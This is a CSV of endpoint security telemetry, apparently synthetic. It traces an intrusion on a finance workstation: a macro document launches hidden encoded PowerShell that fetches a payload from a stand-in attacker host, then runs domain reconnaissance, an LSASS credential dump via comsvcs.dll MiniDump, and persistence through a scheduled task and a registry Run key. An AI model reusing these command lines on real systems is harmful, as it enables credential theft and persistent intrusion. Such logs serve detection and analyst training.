metadata.event_timestamp,metadata.event_type,principal.hostname,principal.user.userid,principal.process.file.full_path,principal.process.command_line,principal.process.parent_process.file.full_path,principal.process.parent_process.command_line,principal.process.file.sha256,target.ip,target.port,target.hostname,target.registry.registry_key,target.registry.registry_value_name,target.registry.registry_value_data,target.user.userid,security_result.severity
2026-05-15T09:14:22Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k netsvcs,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,,,,,,,,INFORMATIONAL
2026-05-15T09:18:03Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer,C:\Windows\explorer.exe,C:\Windows\explorer.exe,F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2D3C4B5A6F1E2,,,,,,,,INFORMATIONAL
2026-05-15T09:32:11Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,,,,,,,,LOW
2026-05-15T09:32:47Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQAyADUALjE4AC4ANAA0AC8AcwAyAA==",C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,,,,,,,,HIGH
2026-05-15T09:33:02Z,NETWORK_CONNECTION,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,198.51.100.42,443,evil-staging.example,,,,,HIGH
2026-05-15T09:33:18Z,FILE_CREATION,WS-FINANCE-04.corp.local,jdoe,C:\Users\jdoe\AppData\Local\Temp\s2.ps1,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2,,,,,,,,MEDIUM
2026-05-15T09:34:55Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\cmd.exe,cmd.exe /c whoami /all,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,,,,,,,,LOW
2026-05-15T09:35:08Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\nltest.exe,nltest.exe /domain_trusts,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,,,,,,,,MEDIUM
2026-05-15T09:35:21Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\net.exe,"net.exe group ""Domain Admins"" /domain",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,,,,,,,,MEDIUM
2026-05-15T09:37:44Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0,,,,,,,,CRITICAL
2026-05-15T09:37:50Z,FILE_CREATION,WS-FINANCE-04.corp.local,jdoe,C:\Users\jdoe\AppData\Local\Temp\out.bin,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",C:\Windows\System32\rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2,,,,,,,,CRITICAL
2026-05-15T09:40:12Z,PROCESS_LAUNCH,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""UpdateWindowsCheck"" /tr ""C:\Users\jdoe\AppData\Local\Temp\s2.ps1"" /sc onlogon /ru SYSTEM",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4,,,,,,,,HIGH
2026-05-15T09:41:02Z,REGISTRY_VALUE_SET,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\reg.exe,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d ""C:\Users\jdoe\AppData\Local\Temp\s2.ps1""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6,,,,,HKCU\Software\Microsoft\Windows\CurrentVersion\Run,Updater,C:\Users\jdoe\AppData\Local\Temp\s2.ps1,,HIGH
2026-05-15T09:42:33Z,NETWORK_CONNECTION,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,198.51.100.42,443,evil-staging.example,,,,,HIGH
2026-05-15T09:45:08Z,NETWORK_CONNECTION,WS-FINANCE-04.corp.local,jdoe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,198.51.100.42,443,evil-staging.example,,,,,HIGH
